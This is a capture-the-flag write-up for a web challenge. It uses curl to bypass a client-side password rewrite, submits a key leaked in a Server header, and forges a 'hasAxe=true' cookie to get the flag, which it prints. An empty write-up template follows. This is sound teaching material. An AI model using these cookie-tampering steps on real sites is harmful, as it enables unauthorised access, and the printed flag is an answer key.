1. Challenge Summary

- Given: a web challenge at http://browser-boss-fight.web.ctf.umasscybersec.org:48003 with the prompt to break into Bowser's castle and defeat him.
- Goal: recover the flag by exploiting the intended web flaw.

2. Initial Recon / Triage

- Fetching / returned a simple HTML form that POSTs to /password-attempt.
- The page included client-side JavaScript that always rewrote the submitted key to WEAK_NON_KOOPA_KNOCK before form submission.
- The HTTP Server header leaked a themed hint: King Koopa, if you forget the key, check under_the_doormat.

3. Hypotheses & Approach

- The frontend rewrite was likely the first intended obstacle, so the real key should be submitted directly with curl or with JavaScript disabled.
- After entering the castle, any client-controlled state would be suspect, especially cookies.

4. Execution Steps (Reproducible)

Stage 1: inspect the landing page and leaked clue.

```bash
curl -i http://browser-boss-fight.web.ctf.umasscybersec.org:48003/
```

Key observations:

- The form posts to /password-attempt.
- Inline JavaScript forces the submitted value to WEAK_NON_KOOPA_KNOCK.
- The Server header leaks under_the_doormat.

Stage 2: bypass the client-side overwrite and submit the real key directly.

```bash
curl -i -c /tmp/browserboss.cookies \
	-d 'key=under_the_doormat' \
	http://browser-boss-fight.web.ctf.umasscybersec.org:48003/password-attempt
```

This redirected to /bowsers_castle.html and established the authenticated session cookie.

Stage 3: inspect the castle page.

```bash
curl -i -b /tmp/browserboss.cookies \
	http://browser-boss-fight.web.ctf.umasscybersec.org:48003/bowsers_castle.html
```

The response set many themed cookies plus a decisive one:

- hasAxe=false

The page text said Bowser removed the axe, which strongly suggested the app trusted the cookie value.

Stage 4: flip the client-controlled state.

```bash
curl -i -b /tmp/browserboss.cookies -b 'hasAxe=true' \
	http://browser-boss-fight.web.ctf.umasscybersec.org:48003/bowsers_castle.html
```

That returned the victory page containing the flag:

- UMASS{br0k3n_1n_2_b0wz3r5_c4st13}

5. Artifacts Produced

- artifacts/solve.sh: reproducible curl-based solve script.

6. Flag

- UMASS{br0k3n_1n_2_b0wz3r5_c4st13}
# BrOWSER_BOSS_FIGHT

## Challenge Summary
- Given:
- Goal:
- Constraints:

## Initial Recon / Triage
- Observations:
- File identification:
- Entry points:

## Hypotheses & Approach
- Hypothesis 1:
- Hypothesis 2:

## Execution Steps (Reproducible)

### Stage 1
Commands:
```bash
# commands here
```

Results:
- 

### Stage 2
Commands:
```bash
# commands here
```

Results:
- 

## Artifacts Produced
- `artifacts/`

## Flag
```
flag_here
```
